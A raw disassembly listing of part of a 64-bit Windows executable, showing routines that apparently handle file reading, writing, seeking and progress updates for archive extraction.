   140005805:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000580a:	48 83 c4 40          	add    $0x40,%rsp
   14000580e:	41 5f                	pop    %r15
   140005810:	41 5e                	pop    %r14
   140005812:	41 5d                	pop    %r13
   140005814:	c3                   	ret
   140005815:	cc                   	int3
   140005816:	cc                   	int3
   140005817:	cc                   	int3
   140005818:	71 22                	jno    0x14000583c
   14000581a:	5d                   	pop    %rbp
   14000581b:	5c                   	pop    %rsp
   14000581c:	9d                   	popf
   14000581d:	96                   	xchg   %eax,%esi
   14000581e:	f4                   	hlt
   14000581f:	d4                   	(bad)
   140005820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005825:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000582a:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000582f:	57                   	push   %rdi
   140005830:	48 83 ec 30          	sub    $0x30,%rsp
   140005834:	48 8b f9             	mov    %rcx,%rdi
   140005837:	48 8d 35 02 78 00 00 	lea    0x7802(%rip),%rsi        # 0x14000d040
   14000583e:	48 c1 e7 05          	shl    $0x5,%rdi
   140005842:	4c 8b d2             	mov    %rdx,%r10
   140005845:	8b 4c 37 04          	mov    0x4(%rdi,%rsi,1),%ecx
   140005849:	85 c9                	test   %ecx,%ecx
   14000584b:	74 34                	je     0x140005881
   14000584d:	83 f9 01             	cmp    $0x1,%ecx
   140005850:	74 05                	je     0x140005857
   140005852:	83 cb ff             	or     $0xffffffff,%ebx
   140005855:	eb 54                	jmp    0x1400058ab
   140005857:	8b 5c 37 14          	mov    0x14(%rdi,%rsi,1),%ebx
   14000585b:	49 8b ca             	mov    %r10,%rcx
   14000585e:	2b 5c 37 10          	sub    0x10(%rdi,%rsi,1),%ebx
   140005862:	48 63 54 37 10       	movslq 0x10(%rdi,%rsi,1),%rdx
   140005867:	44 3b c3             	cmp    %ebx,%r8d
   14000586a:	41 0f 42 d8          	cmovb  %r8d,%ebx
   14000586e:	48 03 54 37 08       	add    0x8(%rdi,%rsi,1),%rdx
   140005873:	4c 63 c3             	movslq %ebx,%r8
   140005876:	e8 22 35 00 00       	call   0x140008d9d
   14000587b:	01 5c 37 10          	add    %ebx,0x10(%rdi,%rsi,1)
   14000587f:	eb 2a                	jmp    0x1400058ab
   140005881:	48 8b 4c 37 18       	mov    0x18(%rdi,%rsi,1),%rcx
   140005886:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000588b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005891:	48 ff 15 38 3a 00 00 	rex.W call *0x3a38(%rip)        # 0x1400092d0
   140005898:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000589d:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400058a1:	83 cb ff             	or     $0xffffffff,%ebx
   1400058a4:	85 c0                	test   %eax,%eax
   1400058a6:	0f 44 cb             	cmove  %ebx,%ecx
   1400058a9:	8b d9                	mov    %ecx,%ebx
   1400058ab:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400058b0:	8b c3                	mov    %ebx,%eax
   1400058b2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400058b7:	48 83 c4 30          	add    $0x30,%rsp
   1400058bb:	5f                   	pop    %rdi
   1400058bc:	c3                   	ret
   1400058bd:	cc                   	int3
   1400058be:	cc                   	int3
   1400058bf:	cc                   	int3
   1400058c0:	cc                   	int3
   1400058c1:	cc                   	int3
   1400058c2:	cc                   	int3
   1400058c3:	cc                   	int3
   1400058c4:	cc                   	int3
   1400058c5:	cc                   	int3
   1400058c6:	cc                   	int3
   1400058c7:	cc                   	int3
   1400058c8:	71 22                	jno    0x1400058ec
   1400058ca:	5d                   	pop    %rbp
   1400058cb:	5c                   	pop    %rsp
   1400058cc:	9d                   	popf
   1400058cd:	96                   	xchg   %eax,%esi
   1400058ce:	f4                   	hlt
   1400058cf:	d4                   	(bad)
   1400058d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400058d5:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   1400058da:	57                   	push   %rdi
   1400058db:	48 83 ec 30          	sub    $0x30,%rsp
   1400058df:	48 8b d9             	mov    %rcx,%rbx
   1400058e2:	48 8b fa             	mov    %rdx,%rdi
   1400058e5:	48 8b 0d 4c 6f 00 00 	mov    0x6f4c(%rip),%rcx        # 0x14000c838
   1400058ec:	e8 8f e3 ff ff       	call   0x140003c80
   1400058f1:	83 3d 04 7d 00 00 00 	cmpl   $0x0,0x7d04(%rip)        # 0x14000d5fc
   1400058f8:	74 08                	je     0x140005902
   1400058fa:	83 c8 ff             	or     $0xffffffff,%eax
   1400058fd:	e9 95 00 00 00       	jmp    0x140005997
   140005902:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140005907:	48 8d 0d 4a 77 00 00 	lea    0x774a(%rip),%rcx        # 0x14000d058
   14000590e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005914:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140005919:	48 c1 e3 05          	shl    $0x5,%rbx
   14000591d:	48 8b d7             	mov    %rdi,%rdx
   140005920:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   140005924:	48 ff 15 b5 39 00 00 	rex.W call *0x39b5(%rip)        # 0x1400092e0
   14000592b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005930:	85 c0                	test   %eax,%eax
   140005932:	75 05                	jne    0x140005939
   140005934:	83 cb ff             	or     $0xffffffff,%ebx
   140005937:	eb 5c                	jmp    0x140005995
   140005939:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   14000593d:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005940:	74 53                	je     0x140005995
   140005942:	8b 15 e4 7e 00 00    	mov    0x7ee4(%rip),%edx        # 0x14000d82c
   140005948:	03 d3                	add    %ebx,%edx
   14000594a:	83 3d 5b 68 00 00 00 	cmpl   $0x0,0x685b(%rip)        # 0x14000c1ac
   140005951:	89 15 d5 7e 00 00    	mov    %edx,0x7ed5(%rip)        # 0x14000d82c
   140005957:	74 3c                	je     0x140005995
   140005959:	48 8b 0d c8 6e 00 00 	mov    0x6ec8(%rip),%rcx        # 0x14000c828
   140005960:	48 85 c9             	test   %rcx,%rcx
   140005963:	74 30                	je     0x140005995
   140005965:	44 8b 05 b8 7e 00 00 	mov    0x7eb8(%rip),%r8d        # 0x14000d824
   14000596c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005972:	48 6b c2 64          	imul   $0x64,%rdx,%rax
   140005976:	33 d2                	xor    %edx,%edx
   140005978:	49 f7 f0             	div    %r8
   14000597b:	ba 3a 08 00 00       	mov    $0x83a,%edx
   140005980:	41 b8 02 04 00 00    	mov    $0x402,%r8d
   140005986:	4c 8b c8             	mov    %rax,%r9
   140005989:	48 ff 15 70 3b 00 00 	rex.W call *0x3b70(%rip)        # 0x140009500
   140005990:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005995:	8b c3                	mov    %ebx,%eax
   140005997:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000599c:	48 83 c4 30          	add    $0x30,%rsp
   1400059a0:	5f                   	pop    %rdi
   1400059a1:	c3                   	ret
   1400059a2:	cc                   	int3
   1400059a3:	cc                   	int3
   1400059a4:	cc                   	int3
   1400059a5:	cc                   	int3
   1400059a6:	cc                   	int3
   1400059a7:	cc                   	int3
   1400059a8:	71 b8                	jno    0x140005962
   1400059aa:	de 1a                	ficomps (%rdx)
   1400059ac:	3a 2f                	cmp    (%rdi),%ch
   1400059ae:	94                   	xchg   %eax,%esp
   1400059af:	91                   	xchg   %eax,%ecx
   1400059b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400059b5:	57                   	push   %rdi
   1400059b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400059ba:	48 8b d9             	mov    %rcx,%rbx
   1400059bd:	48 8d 3d 7c 76 00 00 	lea    0x767c(%rip),%rdi        # 0x14000d040
   1400059c4:	48 c1 e3 05          	shl    $0x5,%rbx
   1400059c8:	83 7c 3b 04 01       	cmpl   $0x1,0x4(%rbx,%rdi,1)
   1400059cd:	75 15                	jne    0x1400059e4
   1400059cf:	33 c9                	xor    %ecx,%ecx
   1400059d1:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   1400059d8:	48 89 4c 3b 08       	mov    %rcx,0x8(%rbx,%rdi,1)
   1400059dd:	48 89 4c 3b 10       	mov    %rcx,0x10(%rbx,%rdi,1)
   1400059e2:	eb 23                	jmp    0x140005a07
   1400059e4:	48 8b 4c 3b 18       	mov    0x18(%rbx,%rdi,1),%rcx
   1400059e9:	48 ff 15 68 38 00 00 	rex.W call *0x3868(%rip)        # 0x140009258
   1400059f0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400059f5:	33 c9                	xor    %ecx,%ecx
   1400059f7:	85 c0                	test   %eax,%eax
   1400059f9:	74 09                	je     0x140005a04
   1400059fb:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   140005a02:	eb 03                	jmp    0x140005a07
   140005a04:	83 c9 ff             	or     $0xffffffff,%ecx
   140005a07:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005a0c:	8b c1                	mov    %ecx,%eax
   140005a0e:	48 83 c4 20          	add    $0x20,%rsp
   140005a12:	5f                   	pop    %rdi
   140005a13:	c3                   	ret
   140005a14:	cc                   	int3
   140005a15:	cc                   	int3
   140005a16:	cc                   	int3
   140005a17:	cc                   	int3
   140005a18:	71 31                	jno    0x140005a4b
   140005a1a:	5b                   	pop    %rbx
   140005a1b:	38 27                	cmp    %ah,(%rdi)
   140005a1d:	27                   	(bad)
   140005a1e:	59                   	pop    %rcx
   140005a1f:	fe 48 83             	decb   -0x7d(%rax)
   140005a22:	ec                   	in     (%dx),%al
   140005a23:	28 48 c1             	sub    %cl,-0x3f(%rax)
   140005a26:	e1 05                	loope  0x140005a2d
   140005a28:	4c 8d 15 11 76 00 00 	lea    0x7611(%rip),%r10        # 0x14000d040
   140005a2f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140005a35:	46 39 4c 11 04       	cmp    %r9d,0x4(%rcx,%r10,1)
   140005a3a:	75 22                	jne    0x140005a5e
   140005a3c:	45 85 c0             	test   %r8d,%r8d
   140005a3f:	74 16                	je     0x140005a57
   140005a41:	45 2b c1             	sub    %r9d,%r8d
   140005a44:	74 0c                	je     0x140005a52
   140005a46:	45 3b c1             	cmp    %r9d,%r8d
   140005a49:	75 22                	jne    0x140005a6d
   140005a4b:	42 03 54 11 14       	add    0x14(%rcx,%r10,1),%edx
   140005a50:	eb 05                	jmp    0x140005a57
   140005a52:	42 03 54 11 10       	add    0x10(%rcx,%r10,1),%edx
   140005a57:	42 89 54 11 10       	mov    %edx,0x10(%rcx,%r10,1)
   140005a5c:	eb 3e                	jmp    0x140005a9c
   140005a5e:	45 85 c0             	test   %r8d,%r8d
   140005a61:	74 17                	je     0x140005a7a
   140005a63:	45 2b c1             	sub    %r9d,%r8d
   140005a66:	74 15                	je     0x140005a7d
   140005a68:	45 3b c1             	cmp    %r9d,%r8d
   140005a6b:	74 05                	je     0x140005a72
   140005a6d:	83 c8 ff             	or     $0xffffffff,%eax
   140005a70:	eb 2c                	jmp    0x140005a9e
   140005a72:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140005a78:	eb 03                	jmp    0x140005a7d
   140005a7a:	45 33 c9             	xor    %r9d,%r9d
   140005a7d:	4a 8b 4c 11 18       	mov    0x18(%rcx,%r10,1),%rcx
   140005a82:	45 33 c0             	xor    %r8d,%r8d
   140005a85:	48 ff 15 74 38 00 00 	rex.W call *0x3874(%rip)        # 0x140009300
   140005a8c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005a91:	8b d0                	mov    %eax,%edx
   140005a93:	83 c8 ff             	or     $0xffffffff,%eax
   140005a96:	83 fa ff             	cmp    $0xffffffff,%edx
   140005a99:	0f 44 d0             	cmove  %eax,%edx
   140005a9c:	8b c2                	mov    %edx,%eax
   140005a9e:	48 83 c4 28          	add    $0x28,%rsp
   140005aa2:	c3                   	ret
   140005aa3:	cc                   	int3
   140005aa4:	cc                   	int3
   140005aa5:	cc                   	int3
   140005aa6:	cc                   	int3
   140005aa7:	cc                   	int3
   140005aa8:	71 ca                	jno    0x140005a74
   140005aaa:	58                   	pop    %rax
   140005aab:	1e                   	(bad)
   140005aac:	80 0e a9             	orb    $0xa9,(%rsi)
   140005aaf:	be 8b d1 33 c9       	mov    $0xc933d18b,%esi
   140005ab4:	48 ff 25 8d 37 00 00 	rex.W jmp *0x378d(%rip)        # 0x140009248
   140005abb:	cc                   	int3
   140005abc:	cc                   	int3
   140005abd:	cc                   	int3
   140005abe:	cc                   	int3
   140005abf:	cc                   	int3
   140005ac0:	cc                   	int3
   140005ac1:	cc                   	int3
   140005ac2:	cc                   	int3
   140005ac3:	cc                   	int3
   140005ac4:	cc                   	int3
   140005ac5:	cc                   	int3
   140005ac6:	cc                   	int3
   140005ac7:	cc                   	int3
   140005ac8:	71 90                	jno    0x140005a5a
   140005aca:	5b                   	pop    %rbx
   140005acb:	12 e7                	adc    %bh,%ah
   140005acd:	9e                   	sahf
   140005ace:	70 ce                	jo     0x140005a9e
   140005ad0:	48 ff 25 79 37 00 00 	rex.W jmp *0x3779(%rip)        # 0x140009250
   140005ad7:	cc                   	int3
   140005ad8:	cc                   	int3
   140005ad9:	cc                   	int3
   140005ada:	cc                   	int3
   140005adb:	cc                   	int3
   140005adc:	cc                   	int3
   140005add:	cc                   	int3
   140005ade:	cc                   	int3
   140005adf:	cc                   	int3
   140005ae0:	cc                   	int3
   140005ae1:	cc                   	int3
   140005ae2:	cc                   	int3
   140005ae3:	cc                   	int3
   140005ae4:	cc                   	int3
   140005ae5:	cc                   	int3
   140005ae6:	cc                   	int3
   140005ae7:	cc                   	int3
   140005ae8:	71 79                	jno    0x140005b63
   140005aea:	56                   	push   %rsi
   140005aeb:	56                   	push   %rsi
   140005aec:	e9 37 78 b2 48       	jmp    0x188b2d328
   140005af1:	89 5c 24 08          	mov    %ebx,0x8(%rsp)
   140005af5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005afa:	55                   	push   %rbp
   140005afb:	57                   	push   %rdi
   140005afc:	41 56                	push   %r14
   140005afe:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   140005b03:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140005b0a:	48 8b 05 f7 64 00 00 	mov    0x64f7(%rip),%rax        # 0x14000c008
   140005b11:	48 33 c4             	xor    %rsp,%rax
   140005b14:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140005b18:	33 f6                	xor    %esi,%esi
   140005b1a:	48 8b da             	mov    %rdx,%rbx
   140005b1d:	39 35 d9 7a 00 00    	cmp    %esi,0x7ad9(%rip)        # 0x14000d5fc
   140005b23:	74 17                	je     0x140005b3c
   140005b25:	83 f9 03             	cmp    $0x3,%ecx
   140005b28:	75 09                	jne    0x140005b33
   140005b2a:	48 8b 4a 28          	mov    0x28(%rdx),%rcx
   140005b2e:	e8 7d fe ff ff       	call   0x1400059b0
   140005b33:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005b37:	e9 93 01 00 00       	jmp    0x140005ccf
   140005b3c:	85 c9                	test   %ecx,%ecx
   140005b3e:	0f 84 81 01 00 00    	je     0x140005cc5
   140005b44:	83 e9 01             	sub    $0x1,%ecx
   140005b47:	74 13                	je     0x140005b5c
   140005b49:	83 e9 01             	sub    $0x1,%ecx
   140005b4c:	0f 84 e4 00 00 00    	je     0x140005c36
   140005b52:	83 e9 01             	sub    $0x1,%ecx
   140005b55:	74 0c                	je     0x140005b63
   140005b57:	83 f9 01             	cmp    $0x1,%ecx
   140005b5a:	74 d7                	je     0x140005b33
   140005b5c:	33 c0                	xor    %eax,%eax
   140005b5e:	e9 6c 01 00 00       	jmp    0x140005ccf
   140005b63:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140005b67:	4c 8d 05 a2 7a 00 00 	lea    0x7aa2(%rip),%r8        # 0x14000d610
   140005b6e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005b73:	e8 5c f7 ff ff       	call   0x1400052d4
   140005b78:	85 c0                	test   %eax,%eax
   140005b7a:	74 b7                	je     0x140005b33
   140005b7c:	48 8b 7b 28          	mov    0x28(%rbx),%rdi
   140005b80:	4c 8d 35 b9 74 00 00 	lea    0x74b9(%rip),%r14        # 0x14000d040
   140005b87:	48 c1 e7 05          	shl    $0x5,%rdi
   140005b8b:	42 83 7c 37 04 01    	cmpl   $0x1,0x4(%rdi,%r14,1)
   140005b91:	74 a0                	je     0x140005b33
   140005b93:	0f b7 53 32          	movzwl 0x32(%rbx),%edx
   140005b97:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140005b9c:	0f b7 4b 30          	movzwl 0x30(%rbx),%ecx
   140005ba0:	48 ff 15 21 38 00 00 	rex.W call *0x3821(%rip)        # 0x1400093c8
   140005ba7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005bac:	85 c0                	test   %eax,%eax
   140005bae:	74 83                	je     0x140005b33
   140005bb0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005bb5:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140005bba:	48 ff 15 8f 37 00 00 	rex.W call *0x378f(%rip)        # 0x140009350
   140005bc1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005bc6:	85 c0                	test   %eax,%eax
   140005bc8:	0f 84 65 ff ff ff    	je     0x140005b33
   140005bce:	4a 8b 4c 37 18       	mov    0x18(%rdi,%r14,1),%rcx
   140005bd3:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140005bd8:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140005bdd:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005be2:	48 ff 15 0f 37 00 00 	rex.W call *0x370f(%rip)        # 0x1400092f8
   140005be9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005bee:	85 c0                	test   %eax,%eax
   140005bf0:	0f 84 3d ff ff ff    	je     0x140005b33
   140005bf6:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140005bfa:	e8 b1 fd ff ff       	call   0x1400059b0
   140005bff:	66 39 73 34          	cmp    %si,0x34(%rbx)
   140005c03:	75 07                	jne    0x140005c0c
   140005c05:	ba 80 00 00 00       	mov    $0x80,%edx
   140005c0a:	eb 07                	jmp    0x140005c13
   140005c0c:	0f b7 53 34          	movzwl 0x34(%rbx),%edx
   140005c10:	83 e2 27             	and    $0x27,%edx
   140005c13:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005c18:	48 ff 15 59 36 00 00 	rex.W call *0x3659(%rip)        # 0x140009278
   140005c1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c24:	85 c0                	test   %eax,%eax
   140005c26:	0f 84 07 ff ff ff    	je     0x140005b33
   140005c2c:	b8 01 00 00 00       	mov    $0x1,%eax
   140005c31:	e9 99 00 00 00       	jmp    0x140005ccf
   140005c36:	48 8b 0d eb 6b 00 00 	mov    0x6beb(%rip),%rcx        # 0x14000c828
   140005c3d:	48 85 c9             	test   %rcx,%rcx
   140005c40:	74 15                	je     0x140005c57
   140005c42:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140005c46:	ba 37 08 00 00       	mov    $0x837,%edx
   140005c4b:	48 ff 15 26 39 00 00 	rex.W call *0x3926(%rip)        # 0x140009578
   140005c52:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005c57:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140005c5b:	4c 8d 05 ae 79 00 00 	lea    0x79ae(%rip),%r8        # 0x14000d610
   140005c62:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005c67:	e8 68 f6 ff ff       	call   0x1400052d4
   140005c6c:	85 c0                	test   %eax,%eax
   140005c6e:	0f 84 bf fe ff ff    	je     0x140005b33
   140005c74:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005c79:	e8 3a f7 ff ff       	call   0x1400053b8
   140005c7e:	85 c0                	test   %eax,%eax
   140005c80:	0f 84 d6 fe ff ff    	je     0x140005b5c
   140005c86:	ba 02 83 00 00       	mov    $0x8302,%edx
   140005c8b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005c90:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   140005c96:	e8 25 f9 ff ff       	call   0x1400055c0
   140005c9b:	48 8b d8             	mov    %rax,%rbx
   140005c9e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005ca2:	0f 84 8b fe ff ff    	je     0x140005b33
   140005ca8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005cad:	e8 c6 f7 ff ff       	call   0x140005478
   140005cb2:	85 c0                	test   %eax,%eax
   140005cb4:	0f 84 79 fe ff ff    	je     0x140005b33
   140005cba:	ff 05 60 7b 00 00    	incl   0x7b60(%rip)        # 0x14000d820
   140005cc0:	48 8b c3             	mov    %rbx,%rax
   140005cc3:	eb 0a                	jmp    0x140005ccf
   140005cc5:	48 8b cb             	mov    %rbx,%rcx
   140005cc8:	e8 2f 00 00 00       	call   0x140005cfc
   140005ccd:	48 98                	cltq
   140005ccf:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   140005cd3:	48 33 cc             	xor    %rsp,%rcx
   140005cd6:	e8 15 2a 00 00       	call   0x1400086f0
   140005cdb:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   140005ce2:	00 
   140005ce3:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005ce7:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005ceb:	49 8b e3             	mov    %r11,%rsp
   140005cee:	41 5e                	pop    %r14
   140005cf0:	5f                   	pop    %rdi
   140005cf1:	5d                   	pop    %rbp
   140005cf2:	c3                   	ret
   140005cf3:	cc                   	int3
   140005cf4:	cc                   	int3
   140005cf5:	cc                   	int3
   140005cf6:	cc                   	int3
   140005cf7:	cc                   	int3
   140005cf8:	cc                   	int3
   140005cf9:	cc                   	int3
   140005cfa:	cc                   	int3
   140005cfb:	cc                   	int3
   140005cfc:	4c 8b d1             	mov    %rcx,%r10
   140005cff:	48 8d 05 36 7b 00 00 	lea    0x7b36(%rip),%rax        # 0x14000d83c
   140005d06:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005d0b:	48 8d 15 3a 7e 00 00 	lea    0x7e3a(%rip),%rdx        # 0x14000db4c
   140005d12:	44 8d 41 7a          	lea    0x7a(%rcx),%r8d
   140005d16:	0f 10 02             	movups (%rdx),%xmm0
   140005d19:	0f 11 00             	movups %xmm0,(%rax)
   140005d1c:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   140005d20:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140005d24:	0f 10 42 20          	movups 0x20(%rdx),%xmm0
   140005d28:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140005d2c:	0f 10 4a 30          	movups 0x30(%rdx),%xmm1
   140005d30:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   140005d34:	0f 10 42 40          	movups 0x40(%rdx),%xmm0
   140005d38:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140005d3c:	0f 10 4a 50          	movups 0x50(%rdx),%xmm1
   140005d40:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   140005d44:	0f 10 42 60          	movups 0x60(%rdx),%xmm0
   140005d48:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140005d4c:	49 03 c0             	add    %r8,%rax
   140005d4f:	0f 10 4a 70          	movups 0x70(%rdx),%xmm1
   140005d53:	49 03 d0             	add    %r8,%rdx
   140005d56:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   140005d5a:	48 83 e9 01          	sub    $0x1,%rcx
   140005d5e:	75 b6                	jne    0x140005d16
   140005d60:	0f 10 02             	movups (%rdx),%xmm0
   140005d63:	ba 04 01 00 00       	mov    $0x104,%edx
   140005d68:	48 8d 0d dd 7d 00 00 	lea    0x7ddd(%rip),%rcx        # 0x14000db4c
   140005d6f:	44 8b c2             	mov    %edx,%r8d
   140005d72:	45 33 db             	xor    %r11d,%r11d
   140005d75:	0f 11 00             	movups %xmm0,(%rax)
   140005d78:	4d 8b 4a 18          	mov    0x18(%r10),%r9
   140005d7c:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140005d83:	48 85 c0             	test   %rax,%rax
   140005d86:	74 15                	je     0x140005d9d
   140005d88:	41 8a 01             	mov    (%r9),%al
   140005d8b:	84 c0                	test   %al,%al
   140005d8d:	74 0e                	je     0x140005d9d
   140005d8f:	88 01                	mov    %al,(%rcx)
   140005d91:	49 ff c1             	inc    %r9
   140005d94:	48 ff c1             	inc    %rcx
   140005d97:	49 83 e8 01          	sub    $0x1,%r8
   140005d9b:	75 df                	jne    0x140005d7c
   140005d9d:	4d 85 c0             	test   %r8,%r8
   140005da0:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005da4:	4c 8b c2             	mov    %rdx,%r8
   140005da7:	48 0f 45 c1          	cmovne %rcx,%rax
   140005dab:	48 8d 0d 9e 7e 00 00 	lea    0x7e9e(%rip),%rcx        # 0x14000dc50
   140005db2:	44 88 18             	mov    %r11b,(%rax)
   140005db5:	4d 8b 4a 08          	mov    0x8(%r10),%r9
   140005db9:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140005dc0:	48 85 c0             	test   %rax,%rax
   140005dc3:	74 15                	je     0x140005dda
   140005dc5:	41 8a 01             	mov    (%r9),%al
   140005dc8:	84 c0                	test   %al,%al
   140005dca:	74 0e                	je     0x140005dda
   140005dcc:	88 01                	mov    %al,(%rcx)
   140005dce:	49 ff c1             	inc    %r9
   140005dd1:	48 ff c1             	inc    %rcx
   140005dd4:	49 83 e8 01          	sub    $0x1,%r8
   140005dd8:	75 df                	jne    0x140005db9
   140005dda:	4d 85 c0             	test   %r8,%r8
   140005ddd:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005de1:	48 0f 45 c1          	cmovne %rcx,%rax
   140005de5:	48 8d 0d 68 7f 00 00 	lea    0x7f68(%rip),%rcx        # 0x14000dd54
   140005dec:	44 88 18             	mov    %r11b,(%rax)
   140005def:	4d 8b 42 10          	mov    0x10(%r10),%r8
   140005df3:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140005dfa:	48 85 c0             	test   %rax,%rax
   140005dfd:	74 15                	je     0x140005e14
   140005dff:	41 8a 00             	mov    (%r8),%al
   140005e02:	84 c0                	test   %al,%al
   140005e04:	74 0e                	je     0x140005e14
   140005e06:	88 01                	mov    %al,(%rcx)
   140005e08:	49 ff c0             	inc    %r8
   140005e0b:	48 ff c1             	inc    %rcx
   140005e0e:	48 83 ea 01          	sub    $0x1,%rdx
   140005e12:	75 df                	jne    0x140005df3
   140005e14:	48 85 d2             	test   %rdx,%rdx
   140005e17:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140005e1b:	48 0f 45 c1          	cmovne %rcx,%rax
   140005e1f:	44 88 18             	mov    %r11b,(%rax)
   140005e22:	41 0f b7 42 36       	movzwl 0x36(%r10),%eax
   140005e27:	66 89 05 2a 80 00 00 	mov    %ax,0x802a(%rip)        # 0x14000de58
   140005e2e:	41 0f b7 42 38       	movzwl 0x38(%r10),%eax
   140005e33:	66 89 05 20 80 00 00 	mov    %ax,0x8020(%rip)        # 0x14000de5a
   140005e3a:	33 c0                	xor    %eax,%eax
   140005e3c:	c3                   	ret
   140005e3d:	cc                   	int3
   140005e3e:	cc                   	int3
   140005e3f:	cc                   	int3
   140005e40:	cc                   	int3
   140005e41:	cc                   	int3
   140005e42:	cc                   	int3
   140005e43:	cc                   	int3
   140005e44:	4c 8b dc             	mov    %rsp,%r11
   140005e47:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140005e4b:	57                   	push   %rdi
   140005e4c:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140005e53:	48 8b 05 ae 61 00 00 	mov    0x61ae(%rip),%rax        # 0x14000c008
   140005e5a:	48 33 c4             	xor    %rsp,%rax
   140005e5d:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140005e62:	33 c0                	xor    %eax,%eax
   140005e64:	4c 8d 0d b5 f9 ff ff 	lea    -0x64b(%rip),%r9        # 0x140005820
   140005e6b:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005e6e:	4c 8d 05 4b f7 ff ff 	lea    -0x8b5(%rip),%r8        # 0x1400055c0
   140005e75:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140005e7a:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140005e7e:	48 8d 15 4b fc ff ff 	lea    -0x3b5(%rip),%rdx        # 0x140005ad0
   140005e85:	49 8d 43 e0          	lea    -0x20(%r11),%rax
   140005e89:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   140005e8d:	48 8d 0d 1c fc ff ff 	lea    -0x3e4(%rip),%rcx        # 0x140005ab0
   140005e94:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140005e9b:	00 
   140005e9c:	48 8d 05 7d fb ff ff 	lea    -0x483(%rip),%rax        # 0x140005a20
   140005ea3:	49 89 43 a8          	mov    %rax,-0x58(%r11)
